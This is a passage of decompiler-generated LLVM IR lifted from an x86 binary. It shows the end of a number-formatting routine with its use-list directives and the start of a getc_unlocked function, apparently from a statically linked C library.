  store i32 ptrtoint (i32* @global_var_806ee73.739 to i32), i32* %v2_8062891, align 4
  %v0_8062898 = load i32, i32* @ecx, align 4
  %v1_8062898 = add i32 %v0_8062898, 12
  store i32 %v1_8062898, i32* @ecx, align 4
  br label %dec_label_pc_806289b

dec_label_pc_806289b:                             ; preds = %dec_label_pc_8062881, %dec_label_pc_8062884
  %v0_806289f = phi i32 [ %v0_8062888, %dec_label_pc_8062881 ], [ %v1_8062898, %dec_label_pc_8062884 ]
  %v0_806289b = load i32, i32* %edx.global-to-local, align 4
  %v1_806289b = icmp eq i32 %v0_806289b, 0
  br i1 %v1_806289b, label %dec_label_pc_80628ae, label %dec_label_pc_806289f

dec_label_pc_806289f:                             ; preds = %dec_label_pc_806289b
  %v1_806289f = inttoptr i32 %v0_806289f to i32*
  store i32 112, i32* %v1_806289f, align 4
  %v0_80628a5 = load i32, i32* %edx.global-to-local, align 4
  %v1_80628a5 = load i32, i32* @ecx, align 4
  %v2_80628a5 = add i32 %v1_80628a5, 4
  %v3_80628a5 = inttoptr i32 %v2_80628a5 to i32*
  store i32 %v0_80628a5, i32* %v3_80628a5, align 4
  %v0_80628a8 = load i32, i32* %edi.global-to-local, align 4
  %v1_80628a8 = load i32, i32* @ecx, align 4
  %v2_80628a8 = add i32 %v1_80628a8, 8
  %v3_80628a8 = inttoptr i32 %v2_80628a8 to i32*
  store i32 %v0_80628a8, i32* %v3_80628a8, align 4
  %v0_80628ab = load i32, i32* @ecx, align 4
  %v1_80628ab = add i32 %v0_80628ab, 12
  store i32 %v1_80628ab, i32* @ecx, align 4
  br label %dec_label_pc_80628ae

dec_label_pc_80628ae:                             ; preds = %dec_label_pc_806289b, %dec_label_pc_806289f
  %v0_80628cc = phi i32 [ %v0_806289f, %dec_label_pc_806289b ], [ %v1_80628ab, %dec_label_pc_806289f ]
  br i1 %v1_80626c8, label %dec_label_pc_80628c2, label %dec_label_pc_80628b5

dec_label_pc_80628b5:                             ; preds = %dec_label_pc_80628ae
  store i32 %tmp156, i32* %eax.global-to-local, align 4
  %v3_80628bc = load i8, i8* %v2_8062855, align 1
  %v4_80628bc = and i8 %v3_80628bc, 16
  %v5_80628bc = icmp eq i8 %v4_80628bc, 0
  br i1 %v5_80628bc, label %dec_label_pc_80628df, label %dec_label_pc_80628c2

dec_label_pc_80628c2:                             ; preds = %dec_label_pc_80628b5, %dec_label_pc_80628ae
  %v0_80628c2 = load i32, i32* %edx.global-to-local, align 4
  %v1_80628c4 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80628c4 = sub i32 %v0_80628c2, %v1_80628c4
  store i32 %v2_80628c4, i32* %eax.global-to-local, align 4
  %v1_80628c6 = load i32, i32* %ebp.global-to-local, align 4
  %v2_80628c6 = sub i32 %v2_80628c4, %v1_80628c6
  %v8_80628c6 = xor i32 %v1_80628c6, %v2_80628c4
  %v9_80628c6 = xor i32 %v2_80628c6, %v2_80628c4
  %v10_80628c6 = and i32 %v9_80628c6, %v8_80628c6
  %v11_80628c6 = icmp slt i32 %v10_80628c6, 0
  %v13_80628c6 = icmp slt i32 %v2_80628c6, 0
  %v2_80628c8 = icmp eq i1 %v13_80628c6, %v11_80628c6
  br i1 %v2_80628c8, label %dec_label_pc_80628df, label %dec_label_pc_80628ca

dec_label_pc_80628ca:                             ; preds = %dec_label_pc_80628c2
  %v2_80628ca = sub i32 %v1_80628c6, %v2_80628c4
  store i32 %v2_80628ca, i32* %ebp.global-to-local, align 4
  %v1_80628cc = inttoptr i32 %v0_80628cc to i32*
  store i32 176, i32* %v1_80628cc, align 4
  %v0_80628d2 = load i32, i32* %ebp.global-to-local, align 4
  %v1_80628d2 = load i32, i32* @ecx, align 4
  %v2_80628d2 = add i32 %v1_80628d2, 4
  %v3_80628d2 = inttoptr i32 %v2_80628d2 to i32*
  store i32 %v0_80628d2, i32* %v3_80628d2, align 4
  %v0_80628d5 = load i32, i32* @ecx, align 4
  %v1_80628d5 = add i32 %v0_80628d5, 8
  %v2_80628d5 = inttoptr i32 %v1_80628d5 to i32*
  store i32 ptrtoint (i32* @global_var_806ee73.739 to i32), i32* %v2_80628d5, align 4
  %v0_80628dc = load i32, i32* @ecx, align 4
  %v1_80628dc = add i32 %v0_80628dc, 12
  store i32 %v1_80628dc, i32* @ecx, align 4
  br label %dec_label_pc_80628df

dec_label_pc_80628df:                             ; preds = %dec_label_pc_80628c2, %dec_label_pc_80628b5, %dec_label_pc_80628ca
  %v1_8062967121 = phi i32 [ %v0_80628cc, %dec_label_pc_80628c2 ], [ %v0_80628cc, %dec_label_pc_80628b5 ], [ %v1_80628dc, %dec_label_pc_80628ca ]
  %v12_80628df = icmp eq i8 %stack_var_-197.2, 102
  br i1 %v12_80628df, label %dec_label_pc_806295a, label %dec_label_pc_80628e6

dec_label_pc_80628e6:                             ; preds = %dec_label_pc_80628df
  %v5_80628e6 = load i32, i32* %edx.global-to-local, align 4
  %v6_80628e6 = and i32 %v5_80628e6, -256
  %v7_80628e6 = or i32 %v6_80628e6, %stack_var_-42.0
  store i32 %v7_80628e6, i32* %edx.global-to-local, align 4
  %v0_80628ed = load i32, i32* %esi.global-to-local, align 4
  %v2_80628ed = icmp slt i32 %v0_80628ed, 0
  %v1_80628ef = trunc i32 %stack_var_-42.0 to i8
  br i1 %v2_80628ed, label %dec_label_pc_80628fe, label %dec_label_pc_8062907

dec_label_pc_80628fe:                             ; preds = %dec_label_pc_80628e6
  store i32 %v0_80628ed, i32* %edx.global-to-local, align 4
  %v1_8062900 = sub i32 0, %v0_80628ed
  br label %dec_label_pc_8062907

dec_label_pc_8062907:                             ; preds = %dec_label_pc_80628e6, %dec_label_pc_80628fe
  %storemerge27 = phi i32 [ %v1_8062900, %dec_label_pc_80628fe ], [ %v0_80628ed, %dec_label_pc_80628e6 ]
  %storemerge9 = phi i8 [ 45, %dec_label_pc_80628fe ], [ 43, %dec_label_pc_80628e6 ]
  store i32 %storemerge27, i32* %edx.global-to-local, align 4
  store i32 0, i32* %stack_var_-27, align 4
  %v2_806290f = ptrtoint i32* %stack_var_-27 to i32
  store i32 %v2_806290f, i32* %ebx.global-to-local, align 4
  store i32 2, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_806291b

dec_label_pc_806291b:                             ; preds = %dec_label_pc_806291b.backedge, %dec_label_pc_8062907
  %v0_8062926 = phi i32 [ %v0_8062926.pre, %dec_label_pc_806291b.backedge ], [ %v2_806290f, %dec_label_pc_8062907 ]
  %v0_8062923 = phi i32 [ %v0_8062923.pre, %dec_label_pc_806291b.backedge ], [ 2, %dec_label_pc_8062907 ]
  %v0_806291b = phi i32 [ %v9_8062924, %dec_label_pc_806291b.backedge ], [ %storemerge27, %dec_label_pc_8062907 ]
  %v1_8062922 = ashr i32 %v0_806291b, 31
  %v1_8062923 = add i32 %v0_8062923, 1
  store i32 %v1_8062923, i32* %edi.global-to-local, align 4
  %v2_8062924 = zext i32 %v0_806291b to i64
  %v4_8062924 = zext i32 %v1_8062922 to i64
  %v5_8062924 = mul nuw i64 %v4_8062924, 4294967296
  %v6_8062924 = or i64 %v5_8062924, %v2_8062924
  %v8_8062924 = sdiv i64 %v6_8062924, 10
  %v9_8062924 = trunc i64 %v8_8062924 to i32
  %v10_8062924 = srem i64 %v6_8062924, 10
  %v1_8062926 = add i32 %v0_8062926, -1
  store i32 %v1_8062926, i32* %ebx.global-to-local, align 4
  store i32 %v9_8062924, i32* %esi.global-to-local, align 4
  %v3_8062929 = and i32 %v9_8062924, -256
  %v1_806292b = trunc i64 %v10_8062924 to i8
  %v2_806292b = add i8 %v1_806292b, 48
  %v12_806292b = zext i8 %v2_806292b to i32
  %v15_806292b = or i32 %v12_806292b, %v3_8062929
  store i32 %v15_806292b, i32* %eax.global-to-local, align 4
  %v3_8062930 = inttoptr i32 %v1_8062926 to i8*
  store i8 %v2_806292b, i8* %v3_8062930, align 1
  store i32 %v9_8062924, i32* %edx.global-to-local, align 4
  %v7_8062934 = icmp sgt i32 %v1_8062923, 3
  br i1 %v7_8062934, label %dec_label_pc_8062936, label %dec_label_pc_806291b.backedge

dec_label_pc_8062936:                             ; preds = %dec_label_pc_806291b
  %v2_8062936 = icmp eq i32 %v9_8062924, 0
  %v1_8062938 = icmp eq i1 %v2_8062936, false
  br i1 %v1_8062938, label %dec_label_pc_806291b.backedge, label %dec_label_pc_806293a

dec_label_pc_806291b.backedge:                    ; preds = %dec_label_pc_8062936, %dec_label_pc_806291b
  %v0_8062923.pre = load i32, i32* %edi.global-to-local, align 4
  %v0_8062926.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_806291b

dec_label_pc_806293a:                             ; preds = %dec_label_pc_8062936
  %v4_806293a = zext i8 %storemerge9 to i32
  %v7_806293a = or i32 %v3_8062929, %v4_806293a
  store i32 %v7_806293a, i32* %edx.global-to-local, align 4
  %v0_806293e = load i32, i32* %ebx.global-to-local, align 4
  %v1_806293e = add i32 %v0_806293e, -2
  store i32 %v1_806293e, i32* %eax.global-to-local, align 4
  %v3_8062941 = add i32 %v0_806293e, -1
  %v4_8062941 = inttoptr i32 %v3_8062941 to i8*
  store i8 %storemerge9, i8* %v4_8062941, align 1
  %v5_8062944 = load i32, i32* %edx.global-to-local, align 4
  %v6_8062944 = and i32 %v5_8062944, -256
  %v7_8062944 = or i32 %v6_8062944, %stack_var_-42.0
  store i32 %v7_8062944, i32* %edx.global-to-local, align 4
  %v2_8062948 = load i32, i32* %ebx.global-to-local, align 4
  %v3_8062948 = add i32 %v2_8062948, -2
  %v4_8062948 = inttoptr i32 %v3_8062948 to i8*
  store i8 %v1_80628ef, i8* %v4_8062948, align 1
  %v0_806294b = load i32, i32* @ecx, align 4
  %v1_806294b = inttoptr i32 %v0_806294b to i32*
  store i32 112, i32* %v1_806294b, align 4
  %v0_8062951 = load i32, i32* %edi.global-to-local, align 4
  %v1_8062951 = load i32, i32* @ecx, align 4
  %v2_8062951 = add i32 %v1_8062951, 4
  %v3_8062951 = inttoptr i32 %v2_8062951 to i32*
  store i32 %v0_8062951, i32* %v3_8062951, align 4
  %v0_8062954 = load i32, i32* %eax.global-to-local, align 4
  %v1_8062954 = load i32, i32* @ecx, align 4
  %v2_8062954 = add i32 %v1_8062954, 8
  %v3_8062954 = inttoptr i32 %v2_8062954 to i32*
  store i32 %v0_8062954, i32* %v3_8062954, align 4
  %v0_8062957 = load i32, i32* @ecx, align 4
  %v1_8062957 = add i32 %v0_8062957, 12
  store i32 %v1_8062957, i32* @ecx, align 4
  br label %dec_label_pc_806295a

dec_label_pc_806295a:                             ; preds = %dec_label_pc_80628df, %dec_label_pc_8062589, %dec_label_pc_806293a
  %v0_80629d9 = phi i32 [ %v1_8062967121, %dec_label_pc_80628df ], [ %v2_8062591, %dec_label_pc_8062589 ], [ %v1_8062957, %dec_label_pc_806293a ]
  %v2_806295a = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_806295a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_806295e

dec_label_pc_806295e:                             ; preds = %dec_label_pc_806295e, %dec_label_pc_806295a
  %v0_806295e = phi i32 [ %v2_806295a, %dec_label_pc_806295a ], [ %v1_8062960, %dec_label_pc_806295e ]
  %stack_var_-216.0 = phi i32 [ %v3_806248b, %dec_label_pc_806295a ], [ %v5_8062963, %dec_label_pc_806295e ]
  %v1_806295e = inttoptr i32 %v0_806295e to i32*
  %v2_806295e = load i32, i32* %v1_806295e, align 4
  store i32 %v2_806295e, i32* %ebx.global-to-local, align 4
  %v1_8062960 = add i32 %v0_806295e, 12
  store i32 %v1_8062960, i32* %eax.global-to-local, align 4
  %v5_8062963 = sub i32 %stack_var_-216.0, %v2_806295e
  %v7_8062967 = icmp ult i32 %v1_8062960, %v0_80629d9
  br i1 %v7_8062967, label %dec_label_pc_806295e, label %dec_label_pc_806296b

dec_label_pc_806296b:                             ; preds = %dec_label_pc_806295e
  store i32 %v0_80629d9, i32* %esi.global-to-local, align 4
  %v5_806297e = icmp eq i8 %stack_var_-26.0, 0
  store i32 160, i32* %stack_var_-168, align 4
  %v1_806298e = icmp eq i1 %v5_806297e, false
  %v2_806298e = zext i1 %v1_806298e to i32
  store i32 %v2_806298e, i32* %edx.global-to-local, align 4
  %v2_8062991 = sub i32 %v5_8062963, %v2_806298e
  store i32 %v2_8062991, i32* %eax.global-to-local, align 4
  %tmp190 = icmp slt i32 %v2_8062991, 1
  br i1 %tmp190, label %dec_label_pc_80629db, label %dec_label_pc_806299b

dec_label_pc_806299b:                             ; preds = %dec_label_pc_806296b
  store i32 %tmp156, i32* %edx.global-to-local, align 4
  %v2_80629a2 = inttoptr i32 %v1_80624cb to i8*
  %v3_80629a2 = load i8, i8* %v2_80629a2, align 1
  %v4_80629a2 = and i8 %v3_80629a2, 8
  %v5_80629a2 = icmp eq i8 %v4_80629a2, 0
  br i1 %v5_80629a2, label %dec_label_pc_80629bd, label %dec_label_pc_80629a8

dec_label_pc_80629a8:                             ; preds = %dec_label_pc_806299b
  %v1_80629a8 = add i32 %v0_80629d9, 12
  store i32 %v1_80629a8, i32* %esi.global-to-local, align 4
  %v1_80629ab = inttoptr i32 %v0_80629d9 to i32*
  store i32 160, i32* %v1_80629ab, align 4
  %v1_80629b1 = load i32, i32* @ecx, align 4
  %v2_80629b1 = add i32 %v1_80629b1, 4
  %v3_80629b1 = inttoptr i32 %v2_80629b1 to i32*
  store i32 %v2_8062991, i32* %v3_80629b1, align 4
  %v0_80629b4 = load i32, i32* @ecx, align 4
  %v1_80629b4 = add i32 %v0_80629b4, 8
  %v2_80629b4 = inttoptr i32 %v1_80629b4 to i32*
  store i32 ptrtoint (i32* @global_var_806ee73.739 to i32), i32* %v2_80629b4, align 4
  br label %dec_label_pc_80629db

dec_label_pc_80629bd:                             ; preds = %dec_label_pc_806299b
  store i32 %tmp156, i32* %ebx.global-to-local, align 4
  %v1_80629c4 = add i32 %tmp156, 16
  %v2_80629c4 = inttoptr i32 %v1_80629c4 to i32*
  %v3_80629c4 = load i32, i32* %v2_80629c4, align 4
  %v9_80629c4 = icmp eq i32 %v3_80629c4, 48
  %v1_80629c8 = icmp eq i1 %v9_80629c4, false
  br i1 %v1_80629c8, label %dec_label_pc_80629d5, label %dec_label_pc_80629ca

dec_label_pc_80629ca:                             ; preds = %dec_label_pc_80629bd
  %v3_80629ca = load i32, i32* %stack_var_-152, align 4
  %v5_80629ca = add i32 %v3_80629ca, %v2_8062991
  store i32 %v5_80629ca, i32* %stack_var_-152, align 4
  br label %dec_label_pc_80629d9

dec_label_pc_80629d0:                             ; preds = %dec_label_pc_80629e1
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8062a08

dec_label_pc_80629d5:                             ; preds = %dec_label_pc_80629bd
  br label %dec_label_pc_80629d9

dec_label_pc_80629d9:                             ; preds = %dec_label_pc_80629ca, %dec_label_pc_80629d5
  store i32 %v0_80629d9, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80629db

dec_label_pc_80629db:                             ; preds = %dec_label_pc_806296b, %dec_label_pc_80629a8, %dec_label_pc_80629d9
  store i32 0, i32* %edi.global-to-local, align 4
  %v2_80629dd = ptrtoint i32* %stack_var_-168 to i32
  store i32 %v2_80629dd, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80629e1

dec_label_pc_80629e1:                             ; preds = %dec_label_pc_80629ff, %dec_label_pc_80629db
  call void @__pseudo_call(i32 %tmp156)
  %v1_80629fa = load i32, i32* %ebx.global-to-local, align 4
  %v2_80629fa = add i32 %v1_80629fa, 4
  %v3_80629fa = inttoptr i32 %v2_80629fa to i32*
  %v4_80629fa = load i32, i32* %v3_80629fa, align 4
  %v15_80629fa = icmp eq i32 %v2_8062991, %v4_80629fa
  %v1_80629fd = icmp eq i1 %v15_80629fa, false
  br i1 %v1_80629fd, label %dec_label_pc_80629d0, label %dec_label_pc_80629ff

dec_label_pc_80629ff:                             ; preds = %dec_label_pc_80629e1
  %v1_80629ff = add i32 %v1_80629fa, 12
  store i32 %v1_80629ff, i32* %ebx.global-to-local, align 4
  %v0_8062a02 = load i32, i32* %edi.global-to-local, align 4
  %v2_8062a02 = add i32 %v0_8062a02, %v2_8062991
  store i32 %v2_8062a02, i32* %edi.global-to-local, align 4
  %v1_8062a04 = load i32, i32* %esi.global-to-local, align 4
  %v7_8062a04 = icmp ult i32 %v1_80629ff, %v1_8062a04
  br i1 %v7_8062a04, label %dec_label_pc_80629e1, label %dec_label_pc_8062a08

dec_label_pc_8062a08:                             ; preds = %dec_label_pc_80629ff, %dec_label_pc_80629d0
  %v0_8062a0e = phi i32 [ -1, %dec_label_pc_80629d0 ], [ %v2_8062a02, %dec_label_pc_80629ff ]
  store i32 %v0_8062a0e, i32* %eax.global-to-local, align 4
  %v2_8062a11 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8062a11, i32* @esi, align 4
  store i32 %v0_806246e, i32* @edi, align 4
  store i32 %v0_806246d, i32* @ebp, align 4
  ret i32 %v0_8062a0e

; uselistorder directives
  uselistorder i32 %v0_8062a0e, { 1, 0 }
  uselistorder i32 %v2_8062991, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32 %v2_806298e, { 1, 0 }
  uselistorder i32 %v1_8062960, { 1, 2, 0 }
  uselistorder i32 %v0_806295e, { 1, 0 }
  uselistorder i32 %v0_80629d9, { 1, 3, 2, 4, 0 }
  uselistorder i32 %v9_8062924, { 3, 2, 1, 0, 4 }
  uselistorder i8 %storemerge9, { 1, 0 }
  uselistorder i32 %v0_80628ed, { 2, 1, 0, 3 }
  uselistorder i32 %v2_80628c6, { 1, 0 }
  uselistorder i32 %v1_80628c6, { 1, 0, 2 }
  uselistorder i32 %v2_80628c4, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_8062881, { 1, 0 }
  uselistorder i32 %v2_80627ee, { 2, 1, 3, 0 }
  uselistorder i32 %v2_80627e8, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_8062845, { 4, 0, 3, 1, 2, 5, 6, 7 }
  uselistorder i32 %v1_8062784, { 1, 0 }
  uselistorder i32 %v0_806277f, { 1, 2, 0, 3 }
  uselistorder i32 %v2_806274c, { 1, 2, 3, 0, 4 }
  uselistorder i8 %v2_8062747, { 1, 0 }
  uselistorder i8 %v2_8062740, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v0_8062740, { 1, 0, 3, 2 }
  uselistorder i32 %stack_var_-220.3, { 1, 0 }
  uselistorder i32 %v0_80626ca, { 1, 2, 0 }
  uselistorder i32 %stack_var_-42.0, { 0, 2, 1 }
  uselistorder i8 %stack_var_-207.1, { 4, 3, 1, 5, 0, 2 }
  uselistorder i8 %v4_80626af, { 1, 0 }
  uselistorder i32 %tmp195, { 3, 1, 2, 0 }
  uselistorder x86_fp80 %v3_806267a, { 1, 0 }
  uselistorder i32 %v2_8062633, { 2, 1, 0 }
  uselistorder i32 %v0_80626e9, { 1, 2, 0, 3 }
  uselistorder x86_fp80 %v1_8062605, { 1, 0 }
  uselistorder x86_fp80 %v3_80625e7, { 2, 0, 1, 3, 6, 7, 5, 8, 4, 9, 10 }
  uselistorder i32 %v3_80625e4, { 1, 0 }
  uselistorder x86_fp80 %v4_80625cc, { 2, 0, 1, 3, 4 }
  uselistorder x86_fp80 %v3_80625c6, { 1, 2, 0 }
  uselistorder i32 %v3_80625c3, { 1, 0 }
  uselistorder i32 %v1_80625bc, { 3, 0, 1, 2 }
  uselistorder i32 %stack_var_-220.0, { 2, 0, 1 }
  uselistorder x86_fp80 %v1_80625f5, { 8, 1, 2, 5, 3, 4, 6, 0, 7, 9 }
  uselistorder x86_fp80 %v2_80625bd, { 1, 0 }
  uselistorder i8 %v4_806256d, { 1, 0 }
  uselistorder i3 %v1_806250a, { 1, 0, 2 }
  uselistorder i8 %stack_var_-207.0, { 3, 2, 0, 4, 5, 1, 6, 7 }
  uselistorder i8 %v3_8062492, { 1, 0, 2, 3 }
  uselistorder i32 %v3_806248b, { 1, 0, 2 }
  uselistorder i3 %v4_8062484, { 0, 2, 1, 3 }
  uselistorder i32* %stack_var_-144, { 1, 0, 2 }
  uselistorder i32* %stack_var_-72, { 1, 0, 2 }
  uselistorder i32* %stack_var_-71, { 1, 0 }
  uselistorder i32* %stack_var_-132, { 2, 0, 1 }
  uselistorder i32* %stack_var_-27, { 1, 0 }
  uselistorder i32* %stack_var_-152, { 0, 1, 4, 2, 3 }
  uselistorder i32* %stack_var_-168, { 1, 0 }
  uselistorder i32 %tmp156, { 14, 13, 12, 11, 10, 9, 8, 7, 0, 6, 1, 2, 3, 5, 4 }
  uselistorder x86_fp80 %tmp155, { 3, 2, 1, 0, 4, 5 }
  uselistorder x86_fp80* %st1.global-to-local, { 0, 1, 2, 3, 4, 8, 11, 12, 9, 7, 10, 5, 6 }
  uselistorder x86_fp80* %st0.global-to-local, { 3, 1, 2, 0, 4, 5, 7, 6, 8 }
  uselistorder i3* %fpu_stat_TOP.global-to-local, { 0, 5, 4, 6, 7, 8, 1, 9, 10, 2, 3 }
  uselistorder i32* %esi.global-to-local, { 10, 8, 9, 11, 12, 3, 1, 2, 0, 4, 5, 6, 7 }
  uselistorder i32* %edx.global-to-local, { 13, 14, 15, 16, 17, 18, 28, 19, 20, 22, 24, 23, 25, 21, 26, 0, 3, 1, 4, 2, 5, 6, 7, 8, 9, 27, 10, 11, 12 }
  uselistorder i32* %edi.global-to-local, { 1, 3, 4, 2, 5, 6, 7, 8, 9, 10, 0 }
  uselistorder i32* %ebx.global-to-local, { 15, 16, 17, 18, 19, 21, 22, 20, 23, 24, 25, 26, 28, 27, 29, 12, 0, 1, 2, 3, 7, 8, 4, 5, 6, 9, 10, 11, 13, 14 }
  uselistorder i32* %ebp.global-to-local, { 9, 10, 5, 6, 0, 3, 2, 1, 4, 7, 8 }
  uselistorder i32* %eax.global-to-local, { 19, 20, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 0, 1, 2, 3, 4, 21, 22, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i64 10, { 1, 0, 2 }
  uselistorder i8 43, { 2, 1, 0 }
  uselistorder i8 45, { 2, 4, 1, 0, 3 }
  uselistorder i8 56, { 1, 0 }
  uselistorder i8 -53, { 1, 0 }
  uselistorder i32 165, { 1, 0 }
  uselistorder i32 21, { 0, 4, 1, 2, 3 }
  uselistorder i8 102, { 2, 3, 1, 0 }
  uselistorder i8 103, { 1, 2, 0 }
  uselistorder i8 48, { 13, 14, 0, 7, 1, 11, 8, 9, 2, 10, 3, 5, 4, 6, 12 }
  uselistorder i16 256, { 3, 6, 4, 5, 0, 1, 2, 7 }
  uselistorder x86_fp80 0xK401CEE6B280000000000, { 1, 2, 0 }
  uselistorder x86_fp80 0xK3FFD8000000000000000, { 1, 0, 2, 3 }
  uselistorder x86_fp80 0xK00000000000000000000, { 0, 2, 3, 4, 1 }
  uselistorder i8 6, { 1, 0 }
  uselistorder label %dec_label_pc_80629db, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80629d9, { 1, 0 }
  uselistorder label %dec_label_pc_806295a, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8062907, { 1, 0 }
  uselistorder label %dec_label_pc_80628df, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80628ae, { 1, 0 }
  uselistorder label %dec_label_pc_806289b, { 1, 0 }
  uselistorder label %dec_label_pc_8062881, { 2, 0, 1 }
  uselistorder label %dec_label_pc_806284e, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8062839, { 1, 0 }
  uselistorder label %dec_label_pc_806282e, { 1, 0 }
  uselistorder label %dec_label_pc_80627b5, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80627a7, { 2, 1, 0 }
  uselistorder label %dec_label_pc_806276d, { 1, 0 }
  uselistorder label %dec_label_pc_806273d.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_8062709, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80626d8, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80626c3, { 1, 0 }
  uselistorder label %dec_label_pc_806262f, { 1, 0 }
  uselistorder label %dec_label_pc_8062607, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8062605, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80625f5, { 1, 0 }
  uselistorder label %dec_label_pc_8062589, { 1, 0 }
  uselistorder label %dec_label_pc_80624b2, { 1, 0 }
}

define i32 @getc_unlocked() local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i16* @__decompiler_undefined_function_1()
  %stack_var_-5 = alloca i8, align 1
  %v0_8062a18 = load i32, i32* @ebx, align 4
  %v4_8062a1c = ptrtoint i16* %tmp to i32
  store i32 %v4_8062a1c, i32* @ebx, align 4
  %v1_8062a20 = add i32 %v4_8062a1c, 16
  %v2_8062a20 = inttoptr i32 %v1_8062a20 to i32*
  %v3_8062a20 = load i32, i32* %v2_8062a20, align 4
  %v2_8062a23 = add i32 %v4_8062a1c, 24
  %v3_8062a23 = inttoptr i32 %v2_8062a23 to i32*
  %v4_8062a23 = load i32, i32* %v3_8062a23, align 4
  %v10_8062a23 = icmp ult i32 %v3_8062a20, %v4_8062a23
  br i1 %v10_8062a23, label %dec_label_pc_8062ac5, label %dec_label_pc_8062a2c

dec_label_pc_8062a2c:                             ; preds = %entry
  %v2_8062a2c = load i16, i16* %tmp, align 2
  %v3_8062a2c = zext i16 %v2_8062a2c to i32
  %v1_8062a2f = and i32 %v3_8062a2c, 131
  %v6_8062a39 = icmp ugt i32 %v1_8062a2f, 128
  br i1 %v6_8062a39, label %dec_label_pc_8062a53, label %dec_label_pc_8062a3b

dec_label_pc_8062a3b:                             ; preds = %dec_label_pc_8062a2c
  %v0_8062a3b = load i32, i32* @edx, align 4
  %v6_8062a43 = call i32 @__stdio_trans2r_o(i16* nonnull %tmp, i32 128, i32 %v0_8062a3b, i32 %v0_8062a3b)
  %v1_8062a4b = icmp eq i32 %v6_8062a43, 0
  %v1_8062a4d = icmp eq i1 %v1_8062a4b, false
  br i1 %v1_8062a4d, label %dec_label_pc_8062aea, label %dec_label_pc_8062a3b.dec_label_pc_8062a53_crit_edge

dec_label_pc_8062a3b.dec_label_pc_8062a53_crit_edge: ; preds = %dec_label_pc_8062a3b
  %v0_8062a53.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8062a53

dec_label_pc_8062a53:                             ; preds = %dec_label_pc_8062a3b.dec_label_pc_8062a53_crit_edge, %dec_label_pc_8062a2c
  %v2_8062a87 = phi i32 [ %v0_8062a53.pre, %dec_label_pc_8062a3b.dec_label_pc_8062a53_crit_edge ], [ %v4_8062a1c, %dec_label_pc_8062a2c ]
  %v1_8062a53 = inttoptr i32 %v2_8062a87 to i16*
  %v2_8062a53 = load i16, i16* %v1_8062a53, align 2
  %v3_8062a53 = zext i16 %v2_8062a53 to i32
  store i32 %v3_8062a53, i32* @ecx, align 4
  %v2_8062a56 = and i16 %v2_8062a53, 2
  %v3_8062a56 = icmp eq i16 %v2_8062a56, 0
  br i1 %v3_8062a56, label %dec_label_pc_8062a76, label %dec_label_pc_8062a5b

dec_label_pc_8062a5b:                             ; preds = %dec_label_pc_8062a53
  %tmp20 = urem i16 %v2_8062a53, 2
  %v1_8062a5d = zext i16 %tmp20 to i32
  %tmp19 = sub nsw i32 0, %v1_8062a5d
  %v2_8062a60 = and i32 %tmp19, 4
  %v3_8062a60 = add i32 %v2_8062a87, 36
  %v4_8062a60 = add i32 %v3_8062a60, %v2_8062a60
  %v5_8062a60 = inttoptr i32 %v4_8062a60 to i8*
  %v6_8062a60 = load i8, i8* %v5_8062a60, align 1
  %v7_8062a60 = zext i8 %v6_8062a60 to i32
  %v8_8062a60 = load i32, i32* @edx, align 4
  %v9_8062a60 = and i32 %v8_8062a60, -256
  %v10_8062a60 = or i32 %v9_8062a60, %v7_8062a60
  store i32 %v10_8062a60, i32* %edx.global-to-local, align 4
  %v1_8062a64 = add i16 %v2_8062a53, -1
  store i16 %v1_8062a64, i16* %v1_8062a53, align 2
  %v0_8062a6a = load i32, i32* @ebx, align 4
  %v1_8062a6a = add i32 %v0_8062a6a, 40
  %v2_8062a6a = inttoptr i32 %v1_8062a6a to i32*
  store i32 0, i32* %v2_8062a6a, align 4
  %v0_8062a71 = load i32, i32* %edx.global-to-local, align 4
  %v1_8062a71 = urem i32 %v0_8062a71, 256
  store i32 %v1_8062a71, i32* @edx, align 4
  br label %dec_label_pc_8062aed

dec_label_pc_8062a76:                             ; preds = %dec_label_pc_8062a53
  %v1_8062a76 = add i32 %v2_8062a87, 16
  %v2_8062a76 = inttoptr i32 %v1_8062a76 to i32*
  %v3_8062a76 = load i32, i32* %v2_8062a76, align 4
  %v1_8062a79 = add i32 %v2_8062a87, 20
  %v2_8062a79 = inttoptr i32 %v1_8062a79 to i32*
  %v3_8062a79 = load i32, i32* %v2_8062a79, align 4
  %v15_8062a79 = icmp eq i32 %v3_8062a79, %v3_8062a76
  %v1_8062a7c = icmp eq i1 %v15_8062a79, false
  br i1 %v1_8062a7c, label %dec_label_pc_8062ac5, label %dec_label_pc_8062a7e

dec_label_pc_8062a7e:                             ; preds = %dec_label_pc_8062a76
  %v1_8062a7e = add i32 %v2_8062a87, 4
  %v2_8062a7e = inttoptr i32 %v1_8062a7e to i32*
  %v3_8062a7e = load i32, i32* %v2_8062a7e, align 4
  %v13_8062a7e = icmp eq i32 %v3_8062a7e, -2
  %v1_8062a82 = icmp eq i1 %v13_8062a7e, false
  br i1 %v1_8062a82, label %dec_label_pc_8062a8c, label %dec_label_pc_8062a84

dec_label_pc_8062a84:                             ; preds = %dec_label_pc_8062a7e
